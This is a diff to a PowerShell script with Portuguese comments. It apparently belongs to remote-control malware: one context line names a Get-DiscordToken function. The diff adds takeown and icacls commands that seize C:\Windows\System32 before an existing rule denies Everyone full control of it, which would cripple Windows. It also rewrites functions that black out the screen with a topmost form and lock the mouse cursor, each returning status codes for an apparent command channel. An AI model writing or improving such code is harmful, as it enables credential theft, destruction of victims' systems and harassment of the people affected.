@@ -238,6 +238,8 @@ function Get-DiscordToken {
 function Block-System32 {
     try {
         $path = "C:\Windows\System32"
+        takeown /f $path /r /d y 2>$null
+        icacls $path /grant Administradores:F /t 2>$null
         $acl = Get-Acl $path
         $acl.SetAccessRuleProtection($true, $false)
         $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
@@ -249,19 +251,29 @@ function Block-System32 {
     }
 }
 
-# ===== TELA PRETA =====
+# ===== TELA PRETA (SEM C#) =====
+$global:blackScreenForm = $null
+
 function Black-Screen {
     try {
-        $form = New-Object System.Windows.Forms.Form
-        $form.WindowState = 'Maximized'
-        $form.FormBorderStyle = 'None'
-        $form.TopMost = $true
-        $form.BackColor = 'Black'
-        $form.ControlBox = $false
-        $form.ShowInTaskbar = $false
-        $form.KeyPreview = $true
-        $form.Add_KeyDown({ if ($_.KeyCode -eq 'Escape') { $form.Close() } })
-        $form.ShowDialog()
+        # Cria um form preto em uma thread separada
+        $ps = [powershell]::Create()
+        [void]$ps.AddScript({
+            Add-Type -AssemblyName System.Windows.Forms
+            $form = New-Object System.Windows.Forms.Form
+            $form.WindowState = 'Maximized'
+            $form.FormBorderStyle = 'None'
+            $form.TopMost = $true
+            $form.BackColor = 'Black'
+            $form.ControlBox = $false
+            $form.ShowInTaskbar = $false
+            $form.KeyPreview = $true
+            $form.Add_KeyDown({
+                if ($_.KeyCode -eq 'Escape') { $form.Close() }
+            })
+            $form.ShowDialog()
+        })
+        $ps.BeginInvoke()
         return "BLACK_SCREEN"
     } catch {
         return "BLACK_SCREEN_ERROR"
@@ -270,10 +282,9 @@ function Black-Screen {
 
 function Unlock-Screen {
     try {
-        foreach ($f in [System.Windows.Forms.Application]::OpenForms) {
-            if ($f.BackColor -eq [System.Drawing.Color]::Black -and $f.WindowState -eq 'Maximized') {
-                $f.Close()
-            }
+        # Força o fechamento de todos os forms pretos
+        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
+            $_.Invoke([Action]{ $_.Close() })
         }
         return "SCREEN_UNLOCKED"
     } catch {
@@ -281,21 +292,30 @@ function Unlock-Screen {
     }
 }
 
-# ===== TRAVAR MOUSE (SIMPLES) =====
-$mouseLocked = $false
-$lockThread = $null
+# ===== TRAVAR MOUSE (SEM C#) =====
+$global:mouseLocked = $false
+$global:lockThread = $null
 
 function Lock-Mouse {
     try {
-        $mouseLocked = $true
-        $lockThread = [System.Threading.Thread]::new({
-            while ($mouseLocked) {
-                [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                Start-Sleep -Milliseconds 10
+        if ($global:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
+        
+        $global:mouseLocked = $true
+        
+        $global:lockThread = [System.Threading.Thread]::new({
+            while ($global:mouseLocked) {
+                try {
+                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
+                    Start-Sleep -Milliseconds 5
+                } catch {
+                    # Ignora erros
+                }
             }
         })
-        $lockThread.IsBackground = $true
-        $lockThread.Start()
+        
+        $global:lockThread.IsBackground = $true
+        $global:lockThread.Start()
+        
         return "MOUSE_LOCKED"
     } catch {
         return "MOUSE_ERROR"
@@ -304,8 +324,10 @@ function Lock-Mouse {
 
 function Unlock-Mouse {
     try {
-        $mouseLocked = $false
-        if ($lockThread -and $lockThread.IsAlive) { $lockThread.Abort() }
+        $global:mouseLocked = $false
+        if ($global:lockThread -and $global:lockThread.IsAlive) {
+            $global:lockThread.Abort()
+        }
         return "MOUSE_UNLOCKED"
     } catch {
         return "UNLOCK_ERROR"
